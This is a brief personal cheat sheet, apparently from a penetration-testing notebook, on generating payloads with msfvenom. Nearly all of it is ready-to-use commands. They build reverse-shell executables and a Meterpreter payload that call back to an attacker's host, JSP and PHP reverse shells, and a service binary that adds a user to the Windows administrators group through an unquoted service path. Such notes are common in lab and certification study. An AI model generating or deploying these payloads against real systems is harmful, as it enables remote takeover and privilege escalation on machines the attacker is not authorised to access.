---
publish: true
created: 2026-02-06T17:52:11.453+05:30
modified: 2026-06-22T09:01:03.144+05:30
---

#### msfvenom

^a6da29

msfvenom is payload generator from metasploit.

```
msfvenom --list # to list items. eg: payloads platforms

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.193 LPORT=21 -f exe > bd.exe

# use mutli/handler on lhost
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe


# For unquoted service in windows
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.3 LPORT=1234 -f raw > shell.jsp

msfvenom -p php/reverse_php LHOST=10.10.16.3 LPORT=1234 -o ~/transfer/reverse.php
```
